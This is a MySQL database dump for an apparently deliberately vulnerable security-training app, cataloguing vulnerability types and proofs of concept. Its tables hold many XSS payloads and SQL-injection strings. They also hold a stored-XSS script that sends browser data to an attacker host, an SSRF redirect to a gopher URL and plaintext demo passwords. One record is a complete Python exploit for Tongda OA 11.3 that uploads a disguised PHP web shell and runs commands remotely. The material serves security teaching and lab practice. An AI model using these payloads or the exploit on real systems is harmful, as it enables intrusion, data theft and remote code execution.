/*
 Navicat Premium Data Transfer

 Source Server         : 安全
 Source Server Type    : MySQL
 Source Server Version : 80026
 Source Host           : localhost:3306
 Source Schema         : java_sec_code

 Target Server Type    : MySQL
 Target Server Version : 80026
 File Encoding         : 65001

 Date: 05/01/2022 16:47:40
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for comment
-- ----------------------------
DROP TABLE IF EXISTS `comment`;
CREATE TABLE `comment` (
  `commentid` int NOT NULL AUTO_INCREMENT,
  `fromuser` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '评论者id',
  `commentcontent` varchar(700) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '评论内容',
  `username` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '评论者姓名',
  PRIMARY KEY (`commentid`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- ----------------------------
-- Records of comment
-- ----------------------------
BEGIN;
INSERT INTO `comment` VALUES (1, '1', '哈哈哈', 'tangjing');
INSERT INTO `comment` VALUES (2, '1', 'asdasdasd', 'tj');
INSERT INTO `comment` VALUES (3, '1', 'dsadasdas', 'tj');
INSERT INTO `comment` VALUES (4, '1', '<svg/onload=alert(1)>', 'tj');
INSERT INTO `comment` VALUES (5, '1', '', 'tj');
INSERT INTO `comment` VALUES (6, '1', '<script>alert(/xss1/)</script>', 'tj');
INSERT INTO `comment` VALUES (7, '1', '<a href=\'\' \"alert(\'hello world!\')\">\'>what do you see?</a>', 'tj');
INSERT INTO `comment` VALUES (8, '1', 'a', 'tj');
INSERT INTO `comment` VALUES (9, '1', '<prop>alert(/xss/)</prop>', 'tj');
INSERT INTO `comment` VALUES (10, '1', '<img src=\"javascript.:alert(\'XSS\')\">', 'tj');
INSERT INTO `comment` VALUES (11, '1', '<LAYER SRC=\"http://xss.ha.ckers.org/a.js\"></layer>', 'tj');
INSERT INTO `comment` VALUES (12, '1', '<STYLE. TYPE=\"text/javascript\">alert(\'XSS\');</STYLE>', 'tj');
INSERT INTO `comment` VALUES (13, '1', '<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>', 'tj');
INSERT INTO `comment` VALUES (14, '1', '<table background=\'javascript.:alert(([code])\'></table>', 'tj');
INSERT INTO `comment` VALUES (15, '1', '\r\n<object type=text/html data=\'javascript.:alert(([code]);\'></object>', 'tj');
INSERT INTO `comment` VALUES (16, '1', '%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e', 'tj');
INSERT INTO `comment` VALUES (17, '1', '\r\n<IMG SRC=\"jav&#x09;ascript.:alert(\'XSS\');\">', 'tj');
INSERT INTO `comment` VALUES (18, '1', '(\".test\").prop(\"outerHTML\")', 'tj');
INSERT INTO `comment` VALUES (19, '1', '<META. HTTP-EQUIV=\"refresh\"CONTENT=\"0;url=javascript.:alert(\'XSS\');\">', 'tj');
INSERT INTO `comment` VALUES (20, '1', '<IMG STYLE=\'xss:expre\\ssion(alert(\"XSS\"))\'>\r\n', 'tj');
INSERT INTO `comment` VALUES (21, '1', '<input type=”text ”  onfocus=prompt(1) autofocus>', 'tj');
INSERT INTO `comment` VALUES (22, '1', '<a href=\'\' onclick=alert(\'xss\')>type</a>', 'tj');
COMMIT;

-- ----------------------------
-- Table structure for http
-- ----------------------------
DROP TABLE IF EXISTS `http`;
CREATE TABLE `http` (
  `ip` varchar(255) COLLATE utf8mb4_general_ci NOT NULL,
  `user_agent` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `httpId` int NOT NULL,
  PRIMARY KEY (`httpId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- ----------------------------
-- Records of http
-- ----------------------------
BEGIN;
INSERT INTO `http` VALUES ('127.0.0.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0', 1);
INSERT INTO `http` VALUES ('192.168.1.5', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0', 2);
COMMIT;

-- ----------------------------
-- Table structure for poc_record
-- ----------------------------
DROP TABLE IF EXISTS `poc_record`;
CREATE TABLE `poc_record` (
  `Language` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '编程语言',
  `vultype` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '漏洞类型',
  `firstype` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '一级分类',
  `secondtype` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '二级分类',
  `thitdtype` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '三级分类',
  `poc` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT 'POC记录',
  `CVE-ID` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `CWE-ID` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `vuldescribe` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT '漏洞描述',
  `source` varchar(1638) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '漏洞来源',
  `id` int NOT NULL COMMENT 'id',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- ----------------------------
-- Records of poc_record
-- ----------------------------
BEGIN;
INSERT INTO `poc_record` VALUES ('java', 'sql注入', 'get注入方式', '字符型', NULL, 'http://localhost:8080/sqli/jdbc?username=joychou\' or \'a\'=\'a', NULL, NULL, '访问网址会发生字符型注入', NULL, 1);
INSERT INTO `poc_record` VALUES ('java', 'sql注入', 'get注入方式', '数字型', NULL, 'http://localhost:8080/sqli/jdbc/Intvul?id=1`\' or \'a\'=\'a', NULL, NULL, '访问网址会发生数字型注入', NULL, 2);
INSERT INTO `poc_record` VALUES ('java', 'sql注入', 'get注入方式', '搜索型', NULL, 'http://localhost:8080/sqli/mybatis/vul02?username=joychou\' or \'1\'=\'1\' %23', NULL, NULL, '访问网址会发生搜索型注入', NULL, 3);
INSERT INTO `poc_record` VALUES ('php', 'sql注入', 'post注入', NULL, '写个接口', 'uname=ad\' union select 1,2#&passwd=123&submit=Submit', NULL, NULL, 'if (isset($_POST[\'uname\']) && isset($_POST[\'passwd\'])) {\n    $uname = $_POST[\'uname\'];\n    $passwd = $_POST[\'passwd\'];\n    \n    @$sql=\"SELECT username, password From user WHERE username = \'$uname\' and password=\'$passwd\' Limit 0,1\"\n    $result = mysql_quert($sql)\n    $row = mysql_fetch_array($result)\n\n}\n\n', NULL, 4);
INSERT INTO `poc_record` VALUES ('ASP', 'sql注入', 'cookie注入', NULL, '只接受cookie', 'javascript:alert(document.cookie=\"smallclass=\"+escape(\"148 order by 12\"));', NULL, NULL, '网站程序是通过request(\"id\")方式获取客户端提交的数据，并且在防注入程序中没有对通过request.cookies方式提交的数据进行过滤。', NULL, 5);
INSERT INTO `poc_record` VALUES ('php', 'sql注入', 'http注入', NULL, NULL, '通过设置 http头部构造sql注入的语句，如：设置User-Agent:\' or updatexml(1,concat(0x7e,database()),1),1)#', NULL, NULL, '注入代码INSERT INTO uagent (‘uagent’,‘username’) VALUES (\'\' or updatexml(1,concat(0x7e,database(),0x7e),1),1)#\',\'$uname\');', 'https://www.cnblogs.com/xiangbing123/p/12940225.html', 6);
INSERT INTO `poc_record` VALUES ('php', 'xss', '反射型', NULL, NULL, '反射型XSS是非持久性、参数型的跨站脚本。  <script>alert(/xss/)</script>\n\n反射型XSS的JS代码在Web应用的参数(变量) 中  <script>alert(/xss/)</script>', NULL, NULL, ' 测试网页：    <html>\n<meta charset=\'utf-8\'>\n<head>\n	<title>XSS--测试</title>\n</head>\n<body>\n	<h1>XSS--测试</h1>\n	<form method=\"post\" action=\"xss.php\">\n		<textarea name=\"xsscode\" rows=\"10\" cols=\"50\"></textarea>\n		<br />\n		<input type=\"submit\" name=\"submit\" value=\"提交\">\n	</form>\n</body>\n</html>\nxss.php:<meta charset=\'utf-8\'>\n\n<?php\nif(isset($_REQUEST[\'submit\'])){\n	echo $_REQUEST[\'xsscode\'];\n	echo \"<a href=\'./index.php\'>返回</a>\";\n}else{\n	echo \"<a href=\'./index.php\'>返回</a>\";\n}\n?>\r\n————————————————\r\n版权声明：本文为CSDN博主「Code:Chen」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\r\n原文链接：https://blog.csdn.net/weixin_45677119/article/details/111164997', 'https://blog.csdn.net/weixin_45677119/article/details/111164997', 7);
INSERT INTO `poc_record` VALUES ('php ', 'xss', '存储型', NULL, NULL, '持久性体现在XSS代码不是在某个参数(变量)中，而是写进数据库或文件等可以永久保存数据的介质中。                  http://172.168.30.78:8080/?comment=\n<script>var ele=document.createElement(\'img\');ele.src=\"http://172.168.30.78:8080/hack.php?info=\" + navigator.platform;</script>\n', NULL, NULL, '实验需要至少需要三胎服务器：Web 应用服务器：\n\n<?php\n    // 显示多个用户的评论\n    // 获取用户提交的评论，并存储\n    $file = fopen(\'comment.txt\',\'a\');\n    fwrite($file,$_GET[\'comment\'].\'<br/>\');\n    fclose($file);\n\n    // 在页面中显示所有评论\n    echo \'<h1>元芳，你怎么看</h1>\';\n    $file = fopen(\'comment.txt\',\'r\');\n    fpassthru($file);\n?>\n攻击者的服务器：\n\n<?php\n    $info = $_GET[\'info\'];\n    $file = fopen(\'1.txt\',\'a\');\n    fwrite($file,$info);\n?>', 'https://www.cnblogs.com/shiwai/p/14183660.html', 8);
INSERT INTO `poc_record` VALUES ('php', 'xss', 'dom型', 'innerHtml', NULL, '<svg/onload=alert(1)>', NULL, NULL, '攻击的payload由于修改受害者浏览器页面的DOM树而执行的。其特殊的地方就是payload在浏览器本地修改DOM树而执行，并不会传到服务器上，这也就使得DOM XSS比较难以检测。<html>\n    <head>\n        <title> DOM-XSS TEST </title>\n        <style>\n            #box{width:250px;height:200px;border:1px solid #e5e5e5;background:#f1f1f1;}\n        </style>\n    </head>\n    <body>\n        <script>\n            window.onload= function(){\n                var oBox=document.getElementById(\"box\");\n                var oSpan=document.getElementById(\"span1\");\n                var oText=document.getElementById(\"text1\");\n                var oBtn=document.getElementById(\"Btn\");\n                oBtn.onclick = function(){\n                    oBox.innerHTML = oBox.innerHTML + oSpan.innerHTML + oText.value + \"<br/>\";\n                    // oBox.innerHTML += oSpan.innerHTML + oText.value +  \"<br/>\";//这是简便的写法，在js中 a=a+b ,那么也等同于 a+=b\n                    oText.value=\"\"\n                };\n            }\n        </script>\n\n        <div id=\"box\"></div>\n        <span id=\"span1\">小明：</span>\n        <input type=\"text\" id=\"text1\"/>\n        <input id=\"Btn\" type=\"button\" value=\"发送消息\" name=\"\"/>\n    </body>\n</html>', 'https://www.cnblogs.com/mysticbinary/archive/2020/03/22/12542695.html', 9);
INSERT INTO `poc_record` VALUES ('php', 'xss', 'dom型', '跳转', '构造dom树时是否可以执行其他语言？', 'file:///Users/tangjing/vs%E4%BB%A3%E7%A0%81/test.html（前面是html页面的地址）#javascript:alert(1) ', NULL, NULL, '<html><head><title> DOM-XSS TEST </title> </head>\n    <body>\n        <script>\n            var hash = location.hash;\n            if(hash){\n                var url = hash.substring(1);\n                location.href = url;\n            }\n        </script>\n    </body>\n</html>\n', 'https://www.cnblogs.com/mysticbinary/archive/2020/03/22/12542695.html', 10);
INSERT INTO `poc_record` VALUES ('AS', 'xss', 'flush', NULL, NULL, 'XSSTest.swf jsFunction =alert(/xss/) ', NULL, NULL, 'flash有可以调用js的函数，也就是可以和js通信，因此这些函数如果使用不当就会造成xss。常见的可触发xss的危险函数有：getURL，navigateToURL，ExternalInterface.call，htmlText，loadMovie等等\n{import flash.display.Sprite; import flash.external.ExternalInterface; 公共类XSSTest扩展了Sprite\n \n       {public function XSSTest（）\n \n             {var jsFunction：String = loaderInfo.parameters.jsFunction; var param：String =“abc”;\n \n                    ExternalInterface.call（jsFunction，param）;\n \n             }\n \n       }\n \n}\n', 'https://blog.csdn.net/qq_17204441/article/details/90166059', 11);
INSERT INTO `poc_record` VALUES ('Java+php', 'CSRF', NULL, NULL, NULL, 'http://localhost:8080/urlConnection?url=http://joychou.me/302.php', NULL, NULL, '攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。攻击者服务器的代码为<?php\n$url = \'gopher://35.185.163.134:2333/_joy%0achou\';\nheader(\"location: $url\");\n?>', 'https://github.com/JoyChou93/java-sec-code/wiki/SSRF', 12);
INSERT INTO `poc_record` VALUES ('python', '文件上传漏洞', NULL, NULL, '构造绕过限制+如何执行', '#!/usr/bin/env python3\n# -*- encoding: utf-8 -*-\n\'\'\'\n@File    :   Tongda_rce.py\n@Time    :   2020/03/19 12:00:00\n@Author  :   Al1ex \n@Github	 :   https://github.com/Al1ex\n\'\'\'\n\nimport requests\nimport re\nimport sys\n\n\ndef check(url):\n\n    try:\n        upload_url = url + \'/ispirit/im/upload.php\'\n        flag=\"nt authority\\system\"; \n        headers = {\n        	\"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3\",\n        	\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\", \n        	\"Accept-Encoding\": \"gzip, deflate\",\n        	\"Accept-Language\": \"zh-CN,zh;q=0.9\",  \n        	\"Connection\": \"close\"\n        	}\n        payload =\'\'\'------WebKitFormBoundaryBwVAwV3O4sifyhr3\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\n2\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\nContent-Disposition: form-data; name=\"P\"\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\nContent-Disposition: form-data; name=\"DEST_UID\"\n1\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\nContent-Type: image/jpeg\n<?php\n$command=$_POST[\'cmd\'];\n$wsh = new COM(\'WScript.shell\');\n$exec = $wsh->exec(\"cmd /c \".$command);\n$stdout = $exec->StdOut();\n$stroutput = $stdout->ReadAll();\necho $stroutput;\n?>\n------WebKitFormBoundaryBwVAwV3O4sifyhr3--\n        \'\'\'\n        \n        response = requests.post(upload_url, headers=headers, data=payload)\n        path = response.text\n        filename = path[path.find(\'@\')+1:path.rfind(\'|\')].replace(\"_\",\"\\/\").replace(\"|\",\".\").replace(\"\\\\\",\"\")\n        if response.status_code == 200 and \"OK\" in path:\n            result = include_file(url,filename)\n            if flag in result:\n                return result\n            else:\n                return \n        else:\n            print(\"[+] File upload Fail!\")\n            return\n    except:\n     	pass\n\ndef include_file(url,filename):\n        include_url = url + \"/ispirit/interface/gateway.php\"\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\", \n            \"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n            \"Accept-Encoding\": \"gzip, deflate\",\n            \"Accept-Language\": \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\",  \n            \"Content-Type\":\"application/x-www-form-urlencoded\",\n            \"Connection\": \"close\"\n            }\n        payload = {\n        	\"json\":\"{\\\"url\\\":\\\"/general/../../attach/im/\" + filename + \"\\\"}\",\n        	\"cmd\":\"whoami\"\n        }\n        response = requests.post(include_url,headers=headers,data=payload)\n        return response.text        \n\n\nif __name__ == \'__main__\':\n    print(\'\'\'\n _______                  _____          _____   _____ ______ \n|__   __|                |  __ \\        |  __ \\ / ____|  ____|\n   | | ___  _ __   __ _  | |  | | __ _  | |__) | |    | |__   \n   | |/ _ \\| \'_ \\ / _` | | |  | |/ _` | |  _  /| |    |  __|  \n   | | (_) | | | | (_| | | |__| | (_| | | | \\ \\| |____| |____ \n   |_|\\___/|_| |_|\\__, | |_____/ \\__,_| |_|  \\_\\\\_____|______|\n                   __/ |                                      \n                  |___/                                       \n        \'\'\')\n    url = sys.argv[1]\n    result = check(url)\n    if result:\n        print(\"[+] Congratulations target is vulnerable!!!\")\n        print(\"[+] Remote code execution result is:\"+result)\n\n    else:\n        print(\"[-] There is no remote code execution vulnerability in the target address\")\n', NULL, NULL, '通达文件上传漏洞TDOA11.3', 'https://bbs.ichunqiu.com/thread-59295-1-1.html', 13);
INSERT INTO `poc_record` VALUES ('反序列化', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 14);
INSERT INTO `poc_record` VALUES ('xxe', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 15);
INSERT INTO `poc_record` VALUES ('已知漏洞组件', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 16);
INSERT INTO `poc_record` VALUES ('配置错误', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 17);
INSERT INTO `poc_record` VALUES ('失效访问控制', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 18);
COMMIT;

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `uid` int NOT NULL,
  `username` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `nickname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `password` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `age` int NOT NULL,
  `sex` int NOT NULL,
  `perms` varchar(255) COLLATE utf8mb4_general_ci NOT NULL COMMENT '身份',
  PRIMARY KEY (`uid`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- ----------------------------
-- Records of user
-- ----------------------------
BEGIN;
INSERT INTO `user` VALUES (1, 'tj', 'tangjing', '123', 24, 1, 'user:add');
COMMIT;

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb3;

-- ----------------------------
-- Records of users
-- ----------------------------
BEGIN;
INSERT INTO `users` VALUES (1, 'admin', 'admin123');
INSERT INTO `users` VALUES (2, 'joychou', 'joychou123');
COMMIT;

-- ----------------------------
-- Table structure for vultype
-- ----------------------------
DROP TABLE IF EXISTS `vultype`;
CREATE TABLE `vultype` (
  `level` int DEFAULT NULL COMMENT '几级分类',
  `fatherid` int DEFAULT NULL COMMENT '父类id',
  `href` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '功能跳转链接',
  `introduce` text COLLATE utf8mb4_general_ci COMMENT '漏洞介绍',
  `id` int NOT NULL COMMENT '分类ID',
  `vulname` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '漏洞名字',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- ----------------------------
-- Records of vultype
-- ----------------------------
BEGIN;
INSERT INTO `vultype` VALUES (1, 0, '', 'xee3', 1, 'XXE');
INSERT INTO `vultype` VALUES (2, 1, '/xxe/upload', 'xxe2', 2, 'excel表格上传');
INSERT INTO `vultype` VALUES (1, 0, '/csrf', 'CSRF', 3, 'CSRF');
INSERT INTO `vultype` VALUES (1, 0, NULL, '注入漏洞', 4, '注入漏洞');
INSERT INTO `vultype` VALUES (1, 0, '/xss', 'xss', 5, 'XSS（跨站脚本）');
INSERT INTO `vultype` VALUES (1, 0, 'SSRF', 'SSRF', 6, 'SSRF（服务器端请求伪造）');
INSERT INTO `vultype` VALUES (1, 0, NULL, '开源框架漏洞', 7, '开源框架漏洞');
INSERT INTO `vultype` VALUES (2, 4, '/http', 'http注入', 8, 'http注入');
INSERT INTO `vultype` VALUES (2, 4, '/cookie', 'cookie注入', 9, 'Cookie注入');
INSERT INTO `vultype` VALUES (2, 4, '/login', 'Post注入', 10, 'Post类型注入');
INSERT INTO `vultype` VALUES (2, 5, '/xss/reflect?xss=<script>alert(1)</script>', 'XSS', 11, '反射型XSS');
INSERT INTO `vultype` VALUES (2, 5, '/xss/domxss', 'XSS', 12, 'dom型XSS');
INSERT INTO `vultype` VALUES (2, 5, '/xss/storage', 'xss', 13, '存储型XSS');
INSERT INTO `vultype` VALUES (2, 3, '/CSRF/modifilepassword', NULL, 14, 'CSRF');
INSERT INTO `vultype` VALUES (2, 6, '/SSRF/index', NULL, 15, 'SSRF');
INSERT INTO `vultype` VALUES (2, 7, '/11', '11', 16, 'Log4J漏洞');
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;
